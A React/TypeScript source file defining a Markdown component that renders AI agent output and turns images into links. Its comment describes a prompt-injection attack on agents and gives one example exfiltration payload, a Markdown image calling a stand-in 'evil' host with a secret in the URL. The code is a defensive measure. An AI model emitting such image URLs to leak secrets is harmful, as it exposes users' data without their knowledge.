import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

/**
 * Renders agent-authored text as Markdown. Styling lives in styles.css under
 * `.md` (no @tailwindcss/typography dependency). Links open in the OS browser
 * via the shell's default target="_blank" handling.
 *
 * Images are never fetched: agent output can be steered by prompt injection,
 * and `![](https://evil/?q=<secret>)` would leak data on render with no click.
 * They render as a link the user can choose to open.
 */
export function Markdown({ text, className }: { text: string; className?: string }) {
  return (
    <div className={'md' + (className ? ' ' + className : '')}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          a: ({ node: _node, ...props }) => (
            <a {...props} target="_blank" rel="noreferrer" />
          ),
          img: ({ src, alt }) => (
            <a href={typeof src === 'string' ? src : undefined} target="_blank" rel="noreferrer">
              🖼 {alt || 'image'}
            </a>
          ),
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}
